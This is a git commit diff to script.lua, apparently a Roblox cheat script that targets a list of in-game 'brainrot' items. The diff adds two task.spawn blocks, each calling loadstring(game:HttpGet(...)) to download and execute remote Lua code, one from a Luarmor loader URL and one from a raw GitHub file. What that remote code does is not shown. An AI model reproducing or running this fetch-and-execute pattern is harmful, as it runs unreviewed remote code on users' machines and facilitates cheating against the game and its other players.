5ab110b1128a6fb9757dba84f6554621eb3b2b11
q1z1xx <tsymbal.ivan05@outlook.com>
2026-03-09 15:58:10 +0200

    1

--- script.lua
+++ script.lua
@@ -103,4 +103,9 @@ getgenv().TARGET_BRAINROTS = {
     ["Chicliterita bicicliterita"] = true,
     ["Chicleteirina Bicicleteirina"] = true
 }
+task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+end)
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/q1z1xx/bestscript/refs/heads/main/12.lua"))()
+end)
